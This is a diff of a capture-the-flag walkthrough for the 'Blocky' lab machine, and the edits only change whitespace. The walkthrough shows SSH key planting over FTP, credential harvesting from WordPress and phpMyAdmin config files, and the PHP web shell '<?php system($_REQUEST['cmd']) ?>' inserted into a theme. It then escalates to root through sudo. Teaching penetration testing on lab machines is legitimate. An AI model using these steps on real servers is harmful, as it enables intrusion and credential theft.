@@ -106,8 +106,8 @@ notch@Blocky:~$
 Now we got user.
 
 ### Method 2 - Wordpress Theme Exploitation and Password Seek in Configuration Files
-Let's suppose now that, for some reason this credential does not work with the ssh service and we can somehow exploit the ftp service.
-Now we can try to login to ftp, create a .ssh/ directory and upload our public key into .ssh/authorized_keys and login using our certificate.
+Let's suppose now that, for some reason this credential does not work with the ssh service and we can somehow exploit the ftp service.  
+Now we can try to login to ftp, create a .ssh/ directory and upload our public key into .ssh/authorized_keys and login using our certificate.  
 In order to do this we can establish the followig ftp session:
 ```
 [root@kali Blocky ]$ ftp $TARGET
@@ -133,8 +133,8 @@ ftp> rename id_rsa.pub authorized_keys
 350 File or directory exists, ready for destination name
 250 Rename successful
 ```
-now we can login into ssh.
-As a general rule, in penetration testing, code that connects to database contains connection parameter and in this parameter set we will most likely have credentials.
+now we can login into ssh.  
+As a general rule, in penetration testing, code that connects to database contains connection parameter and in this parameter set we will most likely have credentials.  
 so lets navigate to /var/www/html and grep for the keyword "pass"
 ```
 /** MySQL database password */
@@ -142,17 +142,17 @@ define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
 notch@Blocky:/var/www/html$ cat wp-config.php | grep DB_USER
 define('DB_USER', 'wordpress');
 ```
-As we can see we found the password for user wordpress.
-Let's dig deeper and see if we can get credentials for phpmyadmin.
-Finding credentials for mysql is quite important at this stage, because, if we do find credentials for root user, we can login to mysql cli and drop a shell as root using mysql as privilege escalation vector.
-Now let's navigate to ```/etc/phpmyadmin/```.
-We do not have permission for ```config-db.php``` file as it is owned by www-data. So, let's try to get a shell as user www-data.
-Now that we have user wordpress creds for the database, let's login to phpmyadmin using user wordpress and the disclosed password.
-Now we can navigate to wordpress database, find the ```wp_users``` table and create a new hash for user notch replacing the old one.
-Now we can login in wordpress using the user notch and the password used to generate the hash.
-Once we are logged in wordpress we can easilly obtain a shell by editing the theme files.
-If, for example, we go to Appearance > Editor > Theme Header, we can insert there a simple payload like : ```<?php system($_REQUEST['cmd']) ?>``` and obtain remote code execution and drop a shell as well.
-Once we are logged in as www-data we can read ```config-db.php```.
+As we can see we found the password for user wordpress.  
+Let's dig deeper and see if we can get credentials for phpmyadmin.  
+Finding credentials for mysql is quite important at this stage, because, if we do find credentials for root user, we can login to mysql cli and drop a shell as root using mysql as privilege escalation vector.  
+Now let's navigate to ```/etc/phpmyadmin/```.  
+We do not have permission for ```config-db.php``` file as it is owned by www-data. So, let's try to get a shell as user www-data.  
+Now that we have user wordpress creds for the database, let's login to phpmyadmin using user wordpress and the disclosed password.  
+Now we can navigate to wordpress database, find the ```wp_users``` table and create a new hash for user notch replacing the old one.  
+Now we can login in wordpress using the user notch and the password used to generate the hash.  
+Once we are logged in wordpress we can easilly obtain a shell by editing the theme files.  
+If, for example, we go to Appearance > Editor > Theme Header, we can insert there a simple payload like : ```<?php system($_REQUEST['cmd']) ?>``` and obtain remote code execution and drop a shell as well.  
+Once we are logged in as www-data we can read ```config-db.php```.  
 As expected the file discloses credentials:
 ```
 www-data@Blocky:/var/www/html$ cat /etc/phpmyadmin/config-db.php
@@ -191,7 +191,6 @@ Matching Defaults entries for notch on Blocky:
 
 User notch may run the following commands on Blocky:
     (ALL : ALL) ALL
-
 ```
 Sudo asks for password, but as we are logged in using a password, we can provide the password and retrive sudo capabilities list.
 Given the sudo permission, we can easilly escalate to root by simply doing:
@@ -199,5 +198,5 @@ Given the sudo permission, we can easilly escalate to root by simply doing:
 notch@Blocky:~$ sudo su -
 root@Blocky:~# id
 uid=0(root) gid=0(root) groups=0(root)
-root@Blocky:~# 
+root@Blocky:~#
 ```
